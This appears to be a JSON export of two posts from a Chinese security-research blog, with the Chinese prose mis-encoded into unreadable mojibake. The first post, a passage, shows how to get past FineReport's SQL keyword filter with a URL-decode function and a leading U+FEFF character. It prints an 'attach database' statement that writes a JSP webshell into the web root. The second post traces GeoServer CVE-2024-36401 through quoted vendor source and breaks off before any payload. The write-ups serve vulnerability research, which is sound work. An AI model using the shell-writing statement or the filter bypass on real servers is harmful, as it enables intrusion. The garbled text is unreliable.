çš„ï¼Œä½†å¾ˆå¯æƒœçš„æ˜¯è¿™é‡Œç”¨åˆ°çš„æ˜¯request.getQueryString()ï¼Œå®ƒå¾—åˆ°çš„å†…å®¹åˆ™æ˜¯è§£ç å‰çš„ï¼Œå› æ­¤è¿™ä¸ªæ€è·¯å¾ˆå¿«å°±è¢«å¦å†³äº† è§£å†³æ–¹æ¡ˆäºŒï¼š å¾ˆæ˜¾ç„¶é€šå¸¸æ¥è¯´æˆ‘ä»¬ç¬¬ä¸€ä¸ªå®¹æ˜“æƒ³åˆ°çš„å°±æ˜¯ç”¨å­—ç¬¦æ›¿ä»£çš„æ–¹æ¡ˆï¼ŒåŒå¼•å·ç”¨å•å¼•å·å‡‘åˆï¼Œç©ºæ ¼ç”¨æ³¨é‡Šç¬¦æ›¿æ¢ï¼Œä½†åœ¨è¿™ä¸ªåœºæ™¯ä¸‹å¹¶ä¸æ˜¯å¾ˆå®ç”¨ï¼ŒåŸå› å°±æ˜¯å¦‚æœæˆ‘ä»¬æœ¬èº«æ‰§è¡Œçš„sqlä¸­éœ€è¦ç”¨åˆ°å¼•å·ï¼Œé‚£ä¹ˆå°±æ²¡åŠæ³•äº† è§£å†³æ–¹æ¡ˆä¸‰ï¼š æ—¢ç„¶æ›¿ä»£çš„æ–¹å¼ä¸è¡Œï¼Œé‚£ä¹ˆç¬¬äºŒä¸ªæˆ‘ä»¬å¾ˆå®¹æ˜“æƒ³åˆ°ï¼Œæ—¢ç„¶æ˜¯æ¨¡æ¿ï¼Œé‚£ä¼šä¸ä¼šæœ‰å…¶ä»–ä¸€äº›å†…ç½®å‡½æ•°èƒ½å¤Ÿå¸®åŠ©æˆ‘ä»¬è§£å†³è¿™ä¸ªå›°éš¾ï¼Œç­”æ¡ˆæ˜¯â€œæ˜¯â€ï¼Œåœ¨å®˜ç½‘ä¸­å¾ˆå®¹æ˜“å‘ç°å­˜åœ¨è¿™æ ·ä¸€ä¸ªå†…ç½®å‡½æ•°Decode(å¯¹åº”çŒ¥çå‘è‚².function.DECODE)ï¼Œä»–å¯ä»¥å¸®åŠ©æˆ‘ä»¬å®Œæˆè§£ç ï¼Œä»ä»£ç ä¸­ä¹Ÿèƒ½çœ‹åˆ°ä»…èƒ½å¸®åŠ©æˆ‘ä»¬å®Œæˆurlè§£ç ï¼Œä½†è¿™ä¹Ÿè¶³å¤Ÿäº† ç®€å•æµ‹è¯•ï¼Œè¿™é‡Œæˆ‘ä»¬çš„select 1æˆåŠŸæ‰§è¡Œ å‘ç‚¹äºŒ(é«˜ç‰ˆæœ¬å¯¹DDL/DMLè¯­å¥å­˜åœ¨æ‰§è¡Œé™åˆ¶)è¿™æ—¶å€™æˆ‘ä»¬è‡ªä»¥ä¸ºè§£å†³äº†ä¸€åˆ‡ï¼Œé«˜å…´çš„ä½¿ç”¨attachè¯­å¥å®Œæˆshellçš„è½åœ°ï¼Œé«˜å…´çš„è¾“å…¥ï¼Œä½†å‘ç°ä»€ä¹ˆéƒ½æ²¡æœ‰å‘ç”Ÿ 1attach database &#x27;../webapps/webroot/y4tacker.jsp&#x27; as &#x27;yyds&#x27;; ä¸ºäº†æ’æŸ¥è‡ªç„¶è€Œç„¶çš„æˆ‘ä»¬è‚¯å®šä¼šå…ˆæŸ¥çœ‹æ—¥å¿—ï¼Œå¯¹äºæŸè½¯ç³»ç»Ÿå…¶æ—¥å¿—é€šå¸¸åœ¨å¦‚ä¸‹ä½ç½® æ—¥å¿—ç±»å‹ æ—¥å¿—å­˜å‚¨ æ—¥å¿—å†…å®¹ ç³»ç»Ÿæ—¥å¿— é»˜è®¤å­˜å‚¨åœ¨%FR_HOME%\\logs\\fanruan.log è®¾è®¡å™¨ç«¯å…è®¸ä¿®æ”¹æ—¥å¿—å­˜å‚¨ä½ç½®æœåŠ¡å™¨ç«¯ä¸å…è®¸ä¿®æ”¹æ—¥å¿—å­˜å‚¨ä½ç½® è®°å½•ç³»ç»Ÿè¿è¡Œè¿‡ç¨‹ä¸­çš„ä¸€äº›ä¿¡æ¯ æ“ä½œæ—¥å¿— å­˜å‚¨åœ¨%FR_HOME%\\webapps\\webroot\\logs\\cubeså…è®¸ä¿®æ”¹æ—¥å¿—å­˜å‚¨ä½ç½®11.0.4åŠä¹‹åç‰ˆæœ¬æ”¯æŒå®æ—¶å¤‡ä»½ è®°å½•æ™®é€šç”¨æˆ·å’Œç®¡ç†å‘˜çš„ä½¿ç”¨åŠ¨ä½œ è¡¥å……æ—¥å¿— å­˜å‚¨åœ¨%FR_HOME%\\bin\\error.txtä¸å…è®¸ä¿®æ”¹æ—¥å¿—å­˜å‚¨ä½ç½® è®°å½•è®¾è®¡å™¨é¢„æœŸå¤–çš„æŠ¥é”™ å¾ˆå¿«åœ¨fanruan.logå½“ä¸­ï¼Œæˆ‘ä»¬ä¾¿èƒ½å‘ç°è¿™æ ·ä¸€æ¡æŠ¥é”™DDL/DML query is not permitted è¿™æ—¶å€™æ€ä¹ˆåŠï¼Œå¾ˆæ˜¾ç„¶æˆ‘ä»¬éœ€è¦çœ‹çœ‹å‡½æ•°æ˜¯å¦‚ä½•å¤„ç†çš„ï¼Œé€šè¿‡æŠ¥é”™çš„å †æ ˆæˆ‘ä»¬å¾ˆå®¹æ˜“å‘ç°å…·ä½“çš„å¤„ç†åœ¨çŒ¥çå‘è‚².data.core.db.dialect.base.key.create.executequery.DialectExecuteSecurityQueryKey.execute ç¬¬ä¸€çœ¼ä¸éš¾çœ‹å‡ºï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªcheckQueryçš„å‡½æ•° 1234567891011public ResultSet execute(DialectExecuteQueryParameter dialectExecuteQueryParameter, Dialect current) throws SQLException &#123; String sql = dialectExecuteQueryParameter.getSql(); try &#123; this.checkQuery(sql); &#125; catch (SQLException var5) &#123; throw new SQLException(&quot;DDL/DML query is not permitted for current database, or exist forbidden elements.&quot;); &#125; return dialectExecuteQueryParameter.getStatement().executeQuery(dialectExecuteQueryParameter.getSql());&#125; å…¶é€šè¿‡çŒ¥çå‘è‚².cbb.dialect.security.JDBCSecurityChecker#checkQuery(String)å¤„ç†ï¼ŒæŸ¥çœ‹å…·ä½“é€»è¾‘ ç¬¬ä¸€æ­¥ï¼Œè°ƒç”¨removeSpecialCharacterså»é™¤æŸäº›ç‰¹æ®Šå­—ç¬¦ ç¬¬äºŒéƒ¨ï¼Œè°ƒç”¨checkç»§ç»­æ£€æŸ¥å‚æ•° 1234567891011public static void checkQuery(String query) throws SQLException &#123; checkQuery(query, &quot;&quot;); &#125;public static void checkQuery(String query, String dbType) throws SQLException &#123; checkQuery(query, InsecurityElementFactory.getSqlElements(dbType));&#125;private static void checkQuery(String query, InsecurityElement[] keywords) throws SQLException &#123; query = removeSpecialCharacters(query); check(query, keywords);&#125; å…ˆæ¥çœ‹çœ‹ç¬¬ä¸€æ­¥ï¼Œé€»è¾‘å¾ˆç®€å•ä¸»è¦æ˜¯å…ˆå»é™¤å¼•å·ä»¥åŠæ³¨é‡Šç¬¦ç­‰ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879private static String removeSpecialCharacters(String originalQuery) &#123; if (StringUtils.isEmpty(originalQuery)) &#123; return originalQuery; &#125; else &#123; String query = ignoreQuotesAndNotes(originalQuery.toLowerCase()); StringBuilder result = new StringBuilder(); for(int i = 0; i &lt; query.length(); ++i) &#123; char nextChar = isSpecialCharacter(query.charAt(i)) ? 32 : query.charAt(i); result.append(nextChar); &#125; return result.toString(); &#125;&#125;private static String ignoreQuotesAndNotes(String originalString) &#123; StringBuilder result = new StringBuilder(); char quote = &#x27;0&#x27;; int noteType = false; int position = 0; while(true) &#123; while(position &lt; originalString.length()) &#123; char curChar = originalString.charAt(position); if (isQuote(quote)) &#123; if (curChar == quote) &#123; quote = &#x27;0&#x27;; result.append(&quot; &quot;); &#125; ++position; &#125; else if (noteType) &#123; if (noteType) &#123; if (curChar == &#x27;\\n&#x27;) &#123; noteType = false; result.append(&quot; &quot;); &#125; &#125; else if (position + 1 &lt; originalString.length() &amp;&amp; originalString.charAt(position) == &#x27;*&#x27; &amp;&amp; originalString.charAt(position + 1) == &#x27;/&#x27;) &#123; noteType = false; result.append(&quot; &quot;); ++position; &#125; ++position; &#125; else &#123; if (position + 1 &lt; originalString.length()) &#123; if (originalString.charAt(position) == &#x27;-&#x27; &amp;&amp; originalString.charAt(position + 1) == &#x27;-&#x27;) &#123; noteType = true; result.append(&quot; &quot;); position += 2; continue; &#125; if (originalString.charAt(position) == &#x27;/&#x27; &amp;&amp; originalString.charAt(position + 1) == &#x27;*&#x27;) &#123; noteType = true; result.append(&quot; &quot;); position += 2; continue; &#125; &#125; if (isQuote(curChar)) &#123; result.append(&quot; &quot;); quote = curChar; ++position; &#125; else &#123; result.append(curChar); ++position; &#125; &#125; &#125; return result.toString(); &#125;&#125;private static boolean isSpecialCharacter(char c) &#123; return c == &#x27;,&#x27; || c == &#x27;\\n&#x27; || c == &#x27;;&#x27; || c == &#x27;\\t&#x27; || c == &#x27;\\r&#x27; || c == &#x27;\\f&#x27; || c == 11;&#125; å…³é”®è¿˜æ˜¯å¾—çœ‹ç¬¬äºŒæ­¥ 123456789101112131415private static void check(String query, InsecurityElement[] keywords) throws SQLException &#123; if (StringUtils.isNotEmpty(query) &amp;&amp; ArrayUtils.isNotEmpty(keywords)) &#123; InsecurityElement[] var2 = keywords; int var3 = keywords.length; for(int var4 = 0; var4 &lt; var3; ++var4) &#123; InsecurityElement insecurityElement = var2[var4]; String probedInsecurityStr; if ((probedInsecurityStr = insecurityElement.probed(query)) != null) &#123; throw new SQLException(insecurityElement.msg(probedInsecurityStr)); &#125; &#125; &#125;&#125; é€šè¿‡ç®€å•çš„è°ƒè¯•å¯ä»¥å‘ç°keywordsæ˜¯ä»¥ä¸‹å‡ ä¸ªå…³é”®è¯ æ¥ä¸‹æ¥é‡ç‚¹çœ‹insecurityElement.probedçš„å¤„ç†ï¼ŒinsecurityElementæ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œä»ä¸Šé¢çš„debugä¿¡æ¯æˆ‘ä»¬èƒ½å¾ˆå¿«å®šä½åˆ°å…¶å¯¹åº”çš„å®ç°ç±»ä¸ºçŒ¥çå‘è‚².cbb.dialect.security.element.InsecuritySQLKeywordï¼Œä¸€çœ¼æˆ‘ä»¬å°±èƒ½æƒ³åˆ°ï¼Œåªè¦è¾¾æˆä¸åŒ…å«æ¡ä»¶å³å¯ï¼Œ 1234567891011121314public class InsecuritySQLKeyword extends InsecurityElement &#123; public InsecuritySQLKeyword(String keyWord) &#123; super(keyWord); &#125; public String probed(String sql) &#123; String tmp = &quot; &quot; + sql + &quot; &quot;; return tmp.contains(&quot; &quot; + this.getPattern() + &quot; &quot;) ? this.getPattern() : null; &#125; public String msg(String insecurityElement) &#123; return InterProviderFactory.getProvider().getLocText(&quot;Fine-Core_JDBC_Validation_Query_keywords_Not_Permitted&quot;, new String[]&#123;this.getPattern()&#125;); &#125;&#125; ä½†ç”±äºå‰é¢removeSpecialCharactersçš„ç›¸å…³å¤„ç†ï¼Œåˆ é™¤æ³¨é‡Šï¼Œå»é™¤å¼•å·ä¸­çš„å­—ç¬¦ï¼Œè½¬å°å†™ï¼Œåˆ é™¤éƒ¨åˆ†ç‰¹æ®Šå­—ç¬¦ æ•´ç†ä»¥ä¸Šæ€è·¯æˆ‘ä»¬ä¸éš¾æ’é™¤æ³¨é‡Šã€å¼•å·ã€è½¬å°å†™ç­‰éƒ½ä¸å¯ç”¨ï¼Œåªå‰©ä¸‹ä¸€äº›ç‰¹æ®Šå­—ç¬¦å¯ä»¥æ’ä¸Šç”¨åœºï¼Œå†æ¬¡å›é¡¾è¿™ä¸ªå‡½æ•°ï¼Œå‘ç°ä»–åˆ é™¤çš„ç©ºç™½å­—ç¬¦ä»…æœ‰å››ä¸ªï¼Œè¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥å°è¯•fuzzçœ‹çœ‹%00-%20ä¸­çš„å­—ç¬¦é‚£äº›å¯ä»¥åˆ©ç”¨ï¼Œä½†å¾ˆå¯æƒœç®€å•å°è¯•äº†ä¸‹æ²¡æˆåŠŸ 123private static boolean isSpecialCharacter(char c) &#123; return c == &#x27;,&#x27; || c == &#x27;\\n&#x27; || c == &#x27;;&#x27; || c == &#x27;\\t&#x27; || c == &#x27;\\r&#x27; || c == &#x27;\\f&#x27; || c == 11;&#125; å…¶å®è¿™æ˜¯ç¬¦åˆæˆ‘ä»¬é¢„æœŸçš„ï¼Œé€šè¿‡æ–‡æ¡£æˆ‘ä»¬ä¹Ÿä¸éš¾å‘ç°sqliteæ”¯æŒçš„ç©ºç™½å­—ç¬¦ï¼Œç¡®å®ä»…æœ‰ä»¥ä¸‹äº”ç§(åŒ…å«ç©ºæ ¼) 1SPACES : [ \\u000B\\t\\r\\n] -&gt; channel(HIDDEN); è¿™æ—¶å€™æ€ä¹ˆåŠå‘¢ï¼Œè¿™é‡Œä»‹ç»ä¸€ä¸ªå°trickï¼Œåœ¨sqliteç›¸å…³çš„ä»£ç æ–‡æ¡£ä¸­å†™äº†è¿™æ ·ä¸€å¥è¯https://android.googlesource.com/platform//external/sqlite/+/d11514d85b96ef33b1a78080246df7df2cf5d9ea/dist/orig/sqlite3.h åœ¨è¿™é‡Œæˆ‘ä»¬åªéœ€è¦å…³æ³¨å‰é¢ä¸€å¥è¯å³å¯ï¼Œç®€å•æ¥è¯´å¦‚æœç¬¬ä¸€ä¸ªå­—ç¬¦å­˜åœ¨U+FEFFï¼Œé‚£ä¹ˆä¼šè¢«ç§»é™¤ 123456789** [[byte-order determination rules]] ^The byte-order of** UTF16 input text is determined by the byte-order mark (BOM, U+FEFF)** found in first character, which is removed, or in the absence of a BOM** the byte order is the native byte order of the host** machine for sqlite3_bind_text16() or the byte order specified in** the 6th parameter for sqlite3_bind_text64().)^** ^If UTF16 input text contains invalid unicode** characters, then SQLite might change those invalid characters** into the unicode replacement character: U+FFFD. è¿™ä¸€æ¬¡åˆ©ç”¨è¿™ä¸ªtrickï¼Œæˆ‘ä»¬æˆåŠŸé€šè¿‡äº†æ ¡éªŒ ä¹Ÿå®Œæˆäº†æ–‡ä»¶çš„è½åœ° å‘ç‚¹ä¸‰å†™æ–‡ä»¶åï¼Œå‘ç°ä¸èƒ½è§£æjspï¼Œç©ä¸ªè›‹ï¼Œjasperä¾èµ–ä¹Ÿæ²¡æœ‰ï¼Œæœ€åå‘ç°åº”è¯¥ä»…å½±å“linuxç‰ˆæœ¬ å…·ä½“çœ‹å®˜æ–¹æ–‡æ¡£å°±çŸ¥é“äº†:https://help.fanruan.com/finereport/doc-view-822.html","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"}]},{"title":"æµ…æGeoServer property è¡¨è¾¾å¼æ³¨å…¥ä»£ç æ‰§è¡Œ(CVE-2024-36401)","slug":"year/2024/7/æµ…æGeoServer-property-è¡¨è¾¾å¼æ³¨å…¥ä»£ç æ‰§è¡Œ-CVE-2024-36401","date":"2024-07-03T08:08:26.000Z","updated":"2024-07-04T02:32:32.000Z","comments":true,"path":"2024/07/03/year/2024/7/æµ…æGeoServer-property-è¡¨è¾¾å¼æ³¨å…¥ä»£ç æ‰§è¡Œ-CVE-2024-36401/","link":"","permalink":"https://y4tacker.github.io/2024/07/03/year/2024/7/%E6%B5%85%E6%9E%90GeoServer-property-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2024-36401/","excerpt":"","text":"æ¼æ´å¤ç°åˆ†æä»å…¬å‘Šæ¥çœ‹ï¼Œæ¼æ´æ¥æºäºgeotoolsè¿™ä¸ªåº“ä½¿ç”¨apache xpathè§£æxpathå¯¼è‡´çš„é—®é¢˜ https://github.com/geoserver/geoserver/security/advisories/GHSA-6jj6-gm7p-fcvv https://github.com/geotools/geotools/pull/4797 https://github.com/geotools/geotools/security/advisories/GHSA-w3pj-wh35-fq8w ä¹‹åç®€å•çœ‹çœ‹geotoolsçš„commitå¯ä»¥å‘ç°æœ‰å¾ˆå¤š https://github.com/geotools/geotools/pull/4797/commits/e53e5170ba71521728875a436c80616cfb03c1e8 æ¯”å¦‚ï¼Œä»ä¸Šåˆ°ä¸‹ä¾æ¬¡çœ‹æœ‰å¾ˆå¤šèƒ½è§¦å‘çš„æ–¹å¼ï¼Œè¿™é‡Œæˆ‘ä»¬ç®€å•æœ‰ä¸ªå°è±¡å³å¯ 1234567rg.geotools.appschema.util.XmlXpathUtilites.getXPathValues(NamespaceSupport, String, Document)org.geotools.appschema.util.XmlXpathUtilites.countXPathNodes(NamespaceSupport, String, Document)org.geotools.appschema.util.XmlXpathUtilites.getSingleXPathValue(NamespaceSupport, String, Document)org.geotools.data.complex.expression.FeaturePropertyAccessorFactory.FeaturePropertyAccessor.get(Object, String, Class&lt;T&gt;)org.geotools.data.complex.expression.FeaturePropertyAccessorFactory.FeaturePropertyAccessor.set(Object, String, Object, Class)org.geotools.data.complex.expression.MapPropertyAccessorFactory.new PropertyAccessor() &#123;...&#125;.get(Object, String, Class&lt;T&gt;)org.geotools.xsd.StreamingParser.StreamingParser(Configuration, InputStream, String) å†çœ‹geoserverçš„å…¬å‘Šï¼Œä»¥ä¸‹è¿™äº›éƒ½èƒ½è¢«åˆ©ç”¨ é¦–å…ˆä»¥æœ€ç®€å•çš„GetPropertyValueä¸ºä¾‹ï¼Œä»å®˜æ–¹æ–‡æ¡£å¯ä»¥çœ‹åˆ°å…·ä½“çš„ä½¿ç”¨æ–¹æ³•ï¼Œhttps://docs.geoserver.org/latest/en/user/services/wfs/reference.html#getpropertyvalue æˆ‘æ¯”è¾ƒæ‡’æ‰¾äº†ä¸ªä¹‹å‰çš„è€ç¯å¢ƒä»£ç æ–¹ä¾¿æˆ‘æœ¬åœ°è°ƒè¯• https://versaweb.dl.sourceforge.net/project/geoserver/GeoServer/2.21.3/geoserver-2.21.3-war.zip?viasf=1 å¯ä»¥çœ‹åˆ°åœ¨org.geoserver.wfs.GetPropertyValue#runï¼Œçº¢æ¡†ä¸­çš„ä»£ç ä»è¯·æ±‚ä¸­è·å–äº†valuereferenceå‚æ•°ï¼Œä¹‹åè°ƒç”¨å·¥å‚ç±»çš„propertyæ–¹æ³•è·å–PropertyNameå¯¹è±¡ æˆ‘ä»¬æ¥çœ‹çœ‹è¿™ä¸ªå·¥å‚ç±»çš„è°ƒç”¨ï¼Œç›´æ¥è¿”å›ä¸€ä¸ªè¢«AttributeExpressionImplåŒ…è£…çš„å¯¹è±¡ åŒæ—¶å®ä¾‹åŒ–æ—¶å°†å‚æ•°èµ‹ç»™attPath æ¥ä¸‹æ¥å†æ¥çœ‹çœ‹evaluateçš„è°ƒç”¨ï¼Œåœ¨è¿™é‡Œä¼šé€šè¿‡PropertyAccessors.findPropertyAccessorsè·å–åˆé€‚çš„å±æ€§è®¿é—®å™¨ï¼Œä¹‹åéå†è°ƒç”¨å…¶getæ–¹æ³•ï¼Œå…¶ä¸­å°±åŒ…æ‹¬äº†org.geotools.data.complex.expression.FeaturePropertyAccessorFactory.FeaturePropertyAccessor#getï¼Œå®˜æ–¹å…¬å‘Šåˆ—å‡ºæ¥çš„å°±æœ‰è¿™ä¸ª åœ¨ä¸‹é¢çš„ä»£ç ä¸­å¯ä»¥è§£æxpathè¡¨è¾¾å¼ï¼Œå› æ­¤ä»ä¸Šé¢åˆ†æä¸‹æ¥è¿™ä¸ªxpathå°±æ˜¯valuereferenceä¸­çš„å€¼ï¼Œæ•´ä¸ªæµç¨‹ä¹Ÿå°±èµ°é€šäº† è·¯ç”±åˆ†æåŒæ—¶åƒæˆ‘è¿™ç§å¥½å¥‡å®å®ä¸€èˆ¬æ˜¯æ¯”è¾ƒå¥½å¥‡ä¸€äº›è·¯ç”±æ–¹æ³•çš„è°ƒç”¨ï¼Œå°±æ¯”å¦‚ä¸ºä»€ä¹ˆé€šè¿‡å‚æ•°ä¸­çš„requestèƒ½è°ƒç”¨å¯¹åº”æ–¹æ³•ï¼Œè¿™ä¸ªé¡¹ç›®ä¸»ä½“æ¡†æ¶æ˜¯spring ä»¥æˆ‘ä¸‹è½½çš„warä¸ºä¾‹ï¼Œå…ˆçœ‹web.xmlï¼Œé€šå¸¸è€Œè¨€è¿™å°±æ˜¯æˆ‘ä»¬é¡¹ç›®çš„ä¸»å…¥å£ï¼Œä½†æ˜¯ç‚¹è¿›å»ä¸€çœ‹ï¼Œåœ¨é…ç½®æ–‡ä»¶ä¸­å¤§å¤šåªæœ‰Servletçš„è¿‡æ»¤å™¨é“¾çš„é…ç½®ï¼Œè€Œæ²¡æœ‰å…·ä½“æ¥å£çš„é…ç½®ï¼Œå½“ç„¶å”¯ä¸€çš„å¯ä»¥çœ‹åˆ°å°†è¯·æ±‚éƒ½é€šè¿‡springçš„DispatcherServletæ´¾å‘ 123456789101112&lt;!-- spring dispatcher servlet, dispatches all incoming requests --&gt;&lt;servlet&gt; &lt;servlet-name&gt;dispatcher&lt;/servlet-name&gt; &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt;&lt;/servlet&gt; &lt;!-- single mapping to spring, this only works properly if the advanced dispatch filter is active --&gt;&lt;servlet-mapping&gt; &lt;servlet-name&gt;dispatcher&lt;/servlet-name&gt; &lt;url-pattern&gt;/*&lt;/url-pattern&gt;&lt;/servlet-mapping&gt; å› æ­¤æ¥ä¸‹æ¥æˆ‘ä»¬å°±å¾—çœ‹çœ‹ï¼Œspringé¡¹ç›®çš„ä¸€äº›å…¶ä»–é…ç½®æ–‡ä»¶ï¼Œæ¯”å¦‚\\geoserver\\WEB-INF\\lib\\gs-wfs-2.21.3.jar!\\applicationContext.xmlï¼Œçœ‹ç€è¿™ä¸ªé…ç½®æ–‡ä»¶å°±ä¼šæ›´ä¸ºäº²åˆ‡ï¼Œå½“ç„¶åˆæ‰¯è¿œäº†ï¼Œå›åˆ°æ­£æ–‡ åœ¨è¿™ä¸ªé¡¹ç›®ä¸­ï¼Œorg.geoserver.ows.Dispatcherç»§æ‰¿äº†AbstractControllerå¹¶å®ç°äº†handleRequestInternalæ–¹æ³• 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200protected ModelAndView handleRequestInternal(HttpServletRequest httpRequest, HttpServletResponse httpResponse) throws Exception &#123; this.preprocessRequest(httpRequest); Request request = new Request(); request.setHttpRequest(httpRequest); request.setHttpResponse(httpResponse); Service service = null; try &#123; try &#123; request = this.init(request); REQUEST.set(request); Object result; try &#123; service = this.service(request); &#125; catch (Throwable var11) &#123; this.exception(var11, (Service)null, request); result = null; return (ModelAndView)result; &#125; if (request.getError() != null) &#123; throw request.getError(); &#125; Operation operation = this.dispatch(request, service); request.setOperation(operation); if (request.isSOAP()) &#123; this.flagAsSOAP(operation); &#125; result = this.execute(request, operation); if (result != null) &#123; this.response(result, request, operation); return null; &#125; &#125; catch (Throwable var12) &#123; if (isSecurityException(var12)) &#123; throw (Exception)var12; &#125; this.exception(var12, service, request); &#125; return null; &#125; finally &#123; this.fireFinishedCallback(request); REQUEST.remove(); &#125;&#125;Object execute(Request req, Operation opDescriptor) throws Throwable &#123; Service serviceDescriptor = opDescriptor.getService(); Object serviceBean = serviceDescriptor.getService(); Object[] parameters = opDescriptor.getParameters(); Object result = null; try &#123; if (serviceBean instanceof DirectInvocationService) &#123; String operationName = opDescriptor.getId(); result = ((DirectInvocationService)serviceBean).invokeDirect(operationName, parameters); &#125; else &#123; Method operation = opDescriptor.getMethod(); result = operation.invoke(serviceBean, parameters); &#125; &#125; catch (Exception var8) &#123; if (var8.getCause() != null) &#123; throw var8.getCause(); &#125; throw var8; &#125; return this.fireOperationExecutedCallback(req, opDescriptor, result);&#125;Operation dispatch(Request req, Service serviceDescriptor) throws Throwable &#123; if (req.getRequest() == null) &#123; String msg = &quot;Could not determine geoserver request from http request &quot; + req.getHttpRequest(); throw new ServiceException(msg, &quot;MissingParameterValue&quot;, &quot;request&quot;); &#125; else &#123; boolean exists = this.operationExists(req, serviceDescriptor); if (!exists &amp;&amp; req.getKvp().get(&quot;request&quot;) != null) &#123; req.setRequest(normalize(KvpUtils.getSingleValue(req.getKvp(), &quot;request&quot;))); exists = this.operationExists(req, serviceDescriptor); &#125; Object serviceBean = serviceDescriptor.getService(); Method operation = OwsUtils.method(serviceBean.getClass(), req.getRequest()); if (operation != null &amp;&amp; exists) &#123; Object[] parameters = new Object[operation.getParameterTypes().length]; for(int i = 0; i &lt; parameters.length; ++i) &#123; Class&lt;?&gt; parameterType = operation.getParameterTypes()[i]; if (parameterType.isAssignableFrom(HttpServletRequest.class)) &#123; parameters[i] = req.getHttpRequest(); &#125; else if (parameterType.isAssignableFrom(HttpServletResponse.class)) &#123; parameters[i] = req.getHttpResponse(); &#125; else if (parameterType.isAssignableFrom(InputStream.class)) &#123; parameters[i] = req.getHttpRequest().getInputStream(); &#125; else if (parameterType.isAssignableFrom(OutputStream.class)) &#123; parameters[i] = req.getHttpResponse().getOutputStream(); &#125; else &#123; Object requestBean = null; Throwable t = null; boolean kvpParsed = false; boolean xmlParsed = false; if (req.getKvp() != null &amp;&amp; req.getKvp().size() &gt; 0) &#123; try &#123; requestBean = this.parseRequestKVP(parameterType, req); kvpParsed = true; &#125; catch (Exception var14) &#123; t = var14; &#125; &#125; if (req.getInput() != null) &#123; requestBean = this.parseRequestXML(requestBean, req.getInput(), req); xmlParsed = true; &#125; if (requestBean == null) &#123; if (t != null) &#123; throw t; &#125; if ((!kvpParsed || !xmlParsed) &amp;&amp; (kvpParsed || xmlParsed)) &#123; if (kvpParsed) &#123; throw new ServiceException(&quot;Could not parse the KVP for: &quot; + parameterType.getName()); &#125; throw new ServiceException(&quot;Could not parse the XML for: &quot; + parameterType.getName()); &#125; throw new ServiceException(&quot;Could not find request reader (either kvp or xml) for: &quot; + parameterType.getName() + &quot;, it might be that some request parameters are missing, please check the documentation&quot;); &#125; Method setBaseUrl = OwsUtils.setter(requestBean.getClass(), &quot;baseUrl&quot;, String.class); if (setBaseUrl != null) &#123; setBaseUrl.invoke(requestBean, ResponseUtils.baseURL(req.getHttpRequest())); &#125; if (requestBean != null) &#123; if (req.getService() == null) &#123; req.setService(this.lookupRequestBeanProperty(requestBean, &quot;service&quot;, false)); &#125; if (req.getVersion() == null) &#123; req.setVersion(normalizeVersion(this.lookupRequestBeanProperty(requestBean, &quot;version&quot;, false))); &#125; if (req.getOutputFormat() == null) &#123; req.setOutputFormat(this.lookupRequestBeanProperty(requestBean, &quot;outputFormat&quot;, true)); &#125; parameters[i] = requestBean; &#125; &#125; &#125; if (this.citeCompliant) &#123; if (!&quot;GetCapabilities&quot;.equalsIgnoreCase(req.getRequest())) &#123; if (req.getVersion() == null) &#123; throw new ServiceException(&quot;Could not determine version&quot;, &quot;MissingParameterValue&quot;, &quot;version&quot;); &#125; if (!req.getVersion().matches(&quot;[0-99].[0-99].[0-99]&quot;)) &#123; throw new ServiceException(&quot;Invalid version: &quot; + req.getVersion(), &quot;InvalidParameterValue&quot;, &quot;version&quot;); &#125; boolean found = false; Version version = new Version(req.getVersion()); Iterator var20 = this.loadServices().iterator(); while(var20.hasNext()) &#123; Service service = (Service)var20.next(); if (version.equals(service.getVersion())) &#123; found = true; break; &#125; &#125; if (!found) &#123; throw new ServiceException(&quot;Invalid version: &quot; + req.getVersion(), &quot;InvalidParameterValue&quot;, &quot;version&quot;); &#125; &#125; if (req.getService() == null) &#123; throw new ServiceException(&quot;Could not determine service&quot;, &quot;MissingParameterValue&quot;, &quot;service&quot;); &#125; &#125; Operation op = new Operation(req.getRequest(), serviceDescriptor, operation, parameters); return this.fireOperationDispatchedCallback(req, op); &#125; else &#123; String msg = &quot;No such operation &quot; + req; throw new ServiceException(msg, &quot;OperationNotSupported&quot;, req.getRequest()); &#125; &#125;&#125; ä»ä¸Šé¢çš„ä»£ç ä¸­æˆ‘ä»¬å¾ˆå®¹æ˜“å‘ç°ï¼Œé€šè¿‡dispatchçš„ä»£ç æˆ‘ä»¬å¾ˆå®¹æ˜“å‘ç°ä¼šé€šè¿‡è¿™ä¸ªrequestå¯¹è±¡æŸ¥æ‰¾å¯¹åº”çš„æ–¹æ³•ï¼Œè·å–åˆ°åä¹‹åå†é€šè¿‡executeæ‰§è¡Œï¼Œå› æ­¤ç­”æ¡ˆä¹Ÿå°±æœ‰äº† å½“ç„¶è¿™ä¸ªæ–¹æ³•å¯ä»¥ä»”ç»†çœ‹çœ‹å¯¹è¯·æ±‚çš„è§£æéƒ¨åˆ†ï¼Œé‡Œé¢å¯¹å¤šç§è¯·æ±‚æ–¹å¼çš„è§£æä¹Ÿå¯ä»¥äº†è§£äº†è§£ ä¸€äº›å…·ä½“çš„æµç¨‹å¯å‚è€ƒå¦‚ä¸‹é€»è¾‘ 